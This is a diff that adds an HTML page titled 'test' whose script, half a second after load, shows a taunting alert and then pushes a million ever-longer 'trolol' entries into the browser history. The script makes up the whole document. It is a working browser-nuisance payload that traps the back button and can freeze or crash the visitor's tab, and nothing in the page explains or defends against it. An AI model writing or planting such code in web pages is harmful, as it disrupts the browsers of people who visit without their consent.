@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>test</title>
+        <style>
+            body {
+                background-image: url("troll.jpg");
+            }
+        </style>
+    </head>
+    <body>
+        <script>
+            setTimeout(function(){
+                alert("you shouldn't have come here...");
+                let x = "trol";
+                for (let i = 0; i < 1000000; i++) {
+                    x += "ol";
+                    window.history.pushState(0, 0, x);
+                }
+            }, 500);
+        </script>
+    </body>
+</html>
